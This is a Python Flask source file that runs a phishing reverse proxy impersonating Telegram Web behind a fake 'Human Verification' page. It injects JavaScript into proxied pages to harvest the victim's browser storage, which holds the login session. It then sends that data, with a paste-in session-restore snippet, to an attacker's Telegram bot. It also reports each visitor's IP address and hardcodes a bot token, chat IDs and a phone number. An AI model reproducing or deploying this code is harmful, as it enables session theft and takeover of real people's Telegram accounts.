from flask import Flask, request, Response
import requests
import time

app = Flask(__name__)

# Base URL of the site you want to proxy
BASE_URL = 'https://web.telegram.org/k/'

# Your Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = '7748600145:AAFIALKClYzW9ACeA4GvOuyQQTb1mOcSf1o'
TELEGRAM_CHAT_ID = '-4580685528'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    url = f"{BASE_URL}{path}"
    headers = {key: value for key, value in request.headers if key.lower() != 'host'}

    # Log request method, URL, headers, and data for troubleshooting
    app.logger.info(f"Request Method: {request.method}")
    app.logger.info(f"Request URL: {url}")
    app.logger.info(f"Request Headers: {headers}")
    if request.data:
        app.logger.info(f"Request Data: {request.data}")

    # Handle different HTTP methods
    if request.method == 'POST':
        response = requests.post(url, headers=headers, data=request.data, cookies=request.cookies)
    elif request.method == 'PUT':
        response = requests.put(url, headers=headers, data=request.data, cookies=request.cookies)
    elif request.method == 'DELETE':
        response = requests.delete(url, headers=headers, cookies=request.cookies)
    else:
        response = requests.get(url, headers=headers, cookies=request.cookies)

    # Inject JavaScript for data storage and handling on mobile
    injected_js = """
    <script>
        function sendStorageData() {
            const localStorageData = JSON.stringify(localStorage);
            const sessionStorageData = JSON.stringify(sessionStorage);
            fetch('/store-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    localStorage: localStorageData,
                    sessionStorage: sessionStorageData
                }),
            });
        }
        const keyName = 'user_auth';
        const reloadLimit = 3;

        if (sessionStorage.getItem('reloadCount') === null) {
            sessionStorage.setItem('reloadCount', 0);
        } else {
            let reloadCount = parseInt(sessionStorage.getItem('reloadCount'));
            reloadCount += 1;
            sessionStorage.setItem('reloadCount', reloadCount);

            if (reloadCount >= reloadLimit) {
                console.log("Reload limit reached. Clearing storage...");
                localStorage.clear();
                sessionStorage.clear();
            }
        }
        window.onload = sendStorageData;

        setInterval(function() {
            const value = localStorage.getItem(keyName);
            if (value !== null) {
                console.log(`Key "${keyName}" exists with value:`, value);
                sendStorageData();
                window.location.reload();
            }
        }, 5000);
    </script>
    """

    # Inject JavaScript if the response is HTML content
    if 'text/html' in response.headers.get('Content-Type', ''):
        content = response.text.replace('</body>', injected_js + '</body>')
    else:
        content = response.content

    # Exclude specific headers that could cause issues
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for name, value in response.raw.headers.items() if name.lower() not in excluded_headers]
    return Response(content, response.status_code, headers)

def tg():
    ip = requests.get("https://api.myip.com")
    message = f"New safeguard visit from {ip.text}"
    requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',data={'chat_id': 1409893198, 'text': message} )

tg()

@app.route('/store-data', methods=['POST'])
def store_data():
    storage_data = request.json
    local_storage = storage_data.get('localStorage')
    session_storage = storage_data.get('sessionStorage')

    # Prepare the formatted HTML message
    message = format_message(local_storage)

    # Send the formatted text to Telegram
    send_text_to_telegram(message)

    return 'Data received', 200

REVERSE_PROXY_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Human Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #0f0f0f;
            color: white;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            height: 100vh;
        }
        .container {
            width: 100%;
            height: 100vh;
            background-color: #1a1a1a;
            padding-top: 50px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .container h1 {
            font-size: 2.5em;
            font-weight: bold;
            margin-bottom: 3px;
        }
        .container p {
            font-size: 1.2em;
            margin-bottom: 25px;
        }
        .container a {
            display: inline-block;
            background-color: #2a5f3f;
            color: white;
            padding: 15px 30px;
            font-size: 1.3em;
            text-decoration: underline;
            border-radius: 5px;
            border: 2px solid #255238;
            width: 50%;
            text-align: center;
            font-family: 'Roboto Mono', monospace;
        }
        .container a:hover {
            background-color: #3d7b56;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Human Verification</h1>
        <p>Verify below to be granted entry</p>
        <a href="/">Click here</a>
    </div>
</body>
</html>
"""

@app.route('/verify', methods=['GET'])
def reverse_proxy():
    return REVERSE_PROXY_HTML

def format_message(local_storage):
    name = '?.eth'
    phone = '+6285282631346'
    hit_id = '6717689117'
    copy_code = 'if(location.host=="web.telegram.org"){localStorage.clear();Object.entries(%s).forEach(i => localStorage.setItem(i[0], i[1]))};location.href="https://web.telegram.org/k";' % (local_storage)
    message = f"""
<b>❓ How to login:</b> execute the code below on Telegram WebK (<a href="https://web.telegram.org/k/">https://web.telegram.org/k/</a>)
<code>{copy_code}</code>
"""
    return message

def send_text_to_telegram(message):
    requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',data={'chat_id': TELEGRAM_CHAT_ID, 'text': message, "parse_mode":"html"} )

if __name__ == '__main__':
    app.run(debug=True, port=5000)
